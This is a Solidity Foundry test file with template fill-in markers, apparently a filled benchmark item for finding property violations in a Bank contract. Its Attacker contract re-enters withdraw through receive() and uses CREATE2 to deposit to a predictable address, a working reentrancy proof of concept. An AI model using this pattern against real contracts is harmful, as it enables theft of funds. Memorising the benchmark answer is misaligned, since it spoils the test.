pragma solidity ^0.8.13;
import "forge-std/Test.sol";
import "../Bank.sol";

// property: after a successful withdraw(amount), the balances of any user but the sender are preserved.

/* @fill here with type `contract` */
contract Depositor {
    constructor(Bank bank) payable {
        bank.deposit{value: address(this).balance}();
    }
}

contract Attacker {
    Bank public bank;
    bytes32 public salt;

    constructor(Bank _bank, bytes32 _salt) {
        bank = _bank;
        salt = _salt;
    }

    receive() external payable {
        // Reentrantly create a new contract at a predictable address that deposits into Bank
        new Depositor{salt: salt, value: msg.value}(bank);
    }
}

contract BankTest is Test {       
    address immutable bank_deployer;      
    Bank immutable bank;
    
    constructor() {
        // deploying a Bank contract
        bank_deployer = /* @fill here with type `address` */ address(0xBEEF);
	    vm.prank(bank_deployer);	    
	    bank = new Bank();
    }
    
    
    function test_withdraw_assets_credit_others_violation() public {

        /* @fill here with type `tx_sequence` */
        bytes32 SALT = keccak256("any-salt");
        Attacker attacker = new Attacker(bank, SALT);
        uint256 amt = 1 ether;

        // Fund attacker and deposit to gain withdrawable credits
        vm.deal(address(attacker), amt);
        vm.prank(address(attacker));
        bank.deposit{value: amt}();

	    address user = /* @fill here with type `address` */ address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            bytes1(0xff),
                            address(attacker),
                            SALT,
                            keccak256(abi.encodePacked(type(Depositor).creationCode, abi.encode(bank)))
                        )
                    )
                )
            )
        );
        uint256 credits_slot = uint256(0);
        bytes32 user_credits_slot = keccak256(abi.encode(user, credits_slot));
        uint256 user_creditsBefore = uint256(vm.load(address(bank), user_credits_slot));

        uint256 amount = /* @fill here with type `uint256` */ amt;
        address sender = /* @fill here with type `address` */ address(attacker);
        vm.prank(sender);
        bank.withdraw(amount); // should not revert
	
        uint256 user_creditsAfter = uint256(vm.load(address(bank), user_credits_slot));

        assertNotEq(sender, user, "user equal to sender");

        assertNotEq(user_creditsBefore, user_creditsAfter, "user credits did not change");
    }
}